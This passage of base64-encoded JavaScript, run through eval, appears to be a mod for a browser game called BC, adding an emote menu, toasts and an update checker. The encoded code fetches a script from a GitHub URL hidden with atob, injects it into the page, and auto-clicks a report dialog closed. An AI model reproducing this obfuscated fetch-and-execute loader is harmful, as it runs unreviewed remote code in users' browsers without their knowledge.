J1dHRvbkNpcmNsZSk7CmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKbG9nby5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKbG9nby5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmxvZ28uc3R5bGUud2lkdGggPSAiODBweCI7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gIjgwcHgiOwpsb2dvLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwpsb2dvLnN0eWxlLmxlZnQgPSAiNTAlIjsKbG9nby5zdHlsZS50b3AgPSAiNTAlIjsKbG9nby5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ2lyY2xlLmFwcGVuZENoaWxkKGxvZ28pOwpjb25zdCBidXR0b25zID0gW107CmZvciAobGV0IGkgPSAwOyBpIDwgYnV0dG9uRGF0YS5sZW5ndGg7IGkrKykgewogIGNvbnN0IGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogIGJ1dHRvbi5pbm5lclRleHQgPSBidXR0b25EYXRhW2ldLm5hbWU7CiAgYnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICBidXR0b24uc3R5bGUud2lkdGggPSAiODBweCI7CiAgYnV0dG9uLnN0eWxlLmhlaWdodCA9ICI4MHB4IjsKICBidXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgYnV0dG9uLnN0eWxlLmNvbG9yID0gIndoaXRlIjsKICBidXR0b24uc3R5bGUuYm94U2hhZG93ID0gIjAgMnB4IDVweCByZ2JhKDAsIDAsIDAsIDAuMykiOwogIGJ1dHRvbi5zdHlsZS5sZWZ0ID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLnRvcCA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC0xMDBweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZylgOwogIGJ1dHRvbi5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC4ycyBlYXNlLWluLW91dCwgdHJhbnNmb3JtIDAuMnMgZWFzZS1pbi1vdXQiOwogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGJ1dHRvbkRhdGFbaV0uYWN0aW9uKTsKICBidXR0b25Db250YWluZXIuYXBwZW5kQ2hpbGQoYnV0dG9uKTsKICBidXR0b25zLnB1c2goYnV0dG9uKTsKCiAgLy8gQWRkIGhvdmVyIGFuaW1hdGlvbgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTk5cHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEuMDUpYDsKICB9KTsKCiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCAoKSA9PiB7CiAgICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEpYDsKICB9KTsKfQoKCgovLyBTaG93L2hpZGUgYnV0dG9uIGNvbnRhaW5lciB3aGVuIGAgYW5kIGUga2V5cyBhcmUgcHJlc3NlZApsZXQgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IHRydWU7Cn0gZWxzZSBpZiAoaXNHcmF2ZUtleURvd24gJiYgZXZlbnQua2V5ID09PSAiZSIpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgKGV2ZW50KSA9PiB7CmlmIChldmVudC5rZXkgPT09ICJgIikgewogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7CgovLyBIaWRlIGJ1dHRvbiBjb250YWluZXIgd2hlbiBjbGlja2VkIG91dHNpZGUgb2YgaXQKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoZXZlbnQpID0+IHsKICBpZiAoIWJ1dHRvbkNvbnRhaW5lci5jb250YWlucyhldmVudC50YXJnZXQpKSB7CiAgICBpZiAoYnV0dG9uQ29udGFpbmVyLnBhcmVudE5vZGUgPT09IGRvY3VtZW50LmJvZHkpIHsKICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChidXR0b25Db250YWluZXIpOwogICAgfQogICAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfQp9KTsKCi8vRW5kIE9mIEVtb3RlIE1lbnUgX19fX19fX19fX19fX19fX19fCgovL0VORCBPRiBDT05URVhUIE1FTlUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vQkNNRSBMT0dPIE9uIENoYXJhY3RlcgpmZXRjaChhdG9iKCdhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwwSkRUVk0zTDBKRFRTOXRZV2x1TDBKRFRDNXFjdz09JykpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKLnRoZW4odGV4dCA9PiB7CmNvbnN0IHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzY3JpcHQuaW5uZXJIVE1MID0gdGV4dDsKZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwp9KQoKCmZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94My5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgIH0KICB9CiAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICM0Q0FGNTAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwoKCi8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwogICAgCi8vIEFkZCB0aGUgY3VzdG9tIEJDTSBpY29uCnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gQWRkIHRoZSB0ZXh0IG1lc3NhZ2UKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgCiAgCiAgICAvLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byB0aGUgYm9keQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgCiAgICAvLyBTaG93IHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBpbiBhbmltYXRpb24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgfSwgMCk7CiAgCiAgICAvLyBIaWRlIHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBvdXQgYW5pbWF0aW9uCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgfSwgNTAwMCk7CiAgCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfSwgNTUwMCk7CiAgICBzZW5kRmRlYnVnKCk7CgogIH0KICAKCi8vVGhlIFVwZGF0ZSB0b2FzdApmdW5jdGlvbiBzaG93VG9hc3RVcGRhdGUoKSB7Ci8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCnZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CnZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwoKLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciB3aGlsZSBjb3VudGluZyBkb3duCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKCi8vIENyZWF0ZSB0aGUgY2xvc2UgYnV0dG9uCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChjbG9zZUJ1dHRvbik7CgovLyBDbG9zZSB0aGUgdG9hc3Qgd2hlbiB0aGUgY2xvc2UgYnV0dG9uIGlzIGNsaWNrZWQKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwoKLy8gQkNNRSBsb2dvIHRoZSBsZWZ0CnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gVXBkYXRlIGNsaWVudCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiTmV3IHVwZGF0ZSBkZXRlY3RlZCwgcmVmcmVzaCBCQyB0byB1cGRhdGUgdG8gVjIuMC43IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgovLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byBCQydzIGJvZHkKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CgovLyBTaG93IHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBpbiBhbmltYXRpb24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwp9LCAwKTsKCi8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp9LCA1MDAwMDAwKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKfSwgNTUwMDAwMCk7Cgp9CgogIC8vIEVuZCBvZiBVcGRhdGUgTWFuZWdyZSBUb2FzdF9fX19fX19fX19fX19fX18KCiAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwoKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gYnV0dG9uLmNsaWNrKCkpOwogICAgICB9CiAgICB9CiAgfSwgMSk7CiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CiAgICBpZiAoZWxlbWVudFRvUmVtb3ZlKSB7CiAgICAgIGNvbnN0IGJ1dHRvbnMgPSBlbGVtZW50VG9SZW1vdmUucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uW3N0eWxlPSJjdXJzb3I6IHBvaW50ZXI7Il0nKTsKICAgICAgaWYgKGJ1dHRvbnMpIHsKICAgICAgICBidXR0b25zLmZvckVhY2goYnV0dG9uID0+IHsKICAgICAgICAgIGlmIChidXR0b24udGV4dENvbnRlbnQgPT09ICJEbyBub3Qgc2hvdyB0aGlzIHJlcG9ydCBhZ2FpbiB1bmxlc3Mgc29tZXRoaW5nIGNoYW5nZXMiIHx8IGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkNsb3NlIikgewogICAgICAgICAgICBidXR0b24uY2xpY2soKTsKICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgfQogICAgfQogIH0sIDUwMCk7CgogIC8vIERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgR2l0SHViIHBhZ2UgdG8gY2hlY2sKY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi91cGRhdGVtYW5hZ2VyLmpzJzsKLy8gRGVmaW5lIHRoZSBtYXhpbXVtIHZlcnNpb24gbnVtYmVyIGFsbG93ZWQKY29uc3QgbWF4VmVyc2lvbiA9IDE1OwovLyBEZWZpbmUgYSBmbGFnIHRvIGtlZXAgdHJhY2sgb2Ygd2hldGhlciB0aGUgYWxlcnQgaGFzIGJlZW4gdHJpZ2dlcmVkCmxldCBhbGVydFRyaWdnZXJlZCA9IGZhbHNlOwovLyBEZWZpbmUgYSBmdW5jdGlvbiB0byBjaGVjayB0aGUgdmVyc2lvbiBhbmQgc2hvdyB0aGUgYWxlcnQgaWYgbmVjZXNzYXJ5CmZ1bmN0aW9uIGNoZWNrVmVyc2lvbigpIHsKICBmZXRjaCh1cmwpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbih2ZXJzaW9uID0+IHsKICAgICAgaWYgKHBhcnNlSW50KHZlcnNpb24pID4gbWF4VmVyc2lvbiAmJiAhYWxlcnRUcmlnZ2VyZWQpIHsKICAgICAgICBzaG93VG9hc3RVcGRhdGUoKTsKICAgICAgICBhbGVydFRyaWdnZXJlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pCiAgICAuY2F0Y2goZXJyb3IgPT4gY29uc29sZS5lcnJvcihlcnJvcikpOwp9Ci8vIENoZWNrIGZvciB1cGRhdGVzIGV2ZXJ5IDUgc2Vjb25kcwpzZXRJbnRlcnZhbChjaGVja1ZlcnNpb24sIDUwMDApOwp9Cn0pCgoK')
if (sprc) {
eval(sprc);
}
/*
30
*/
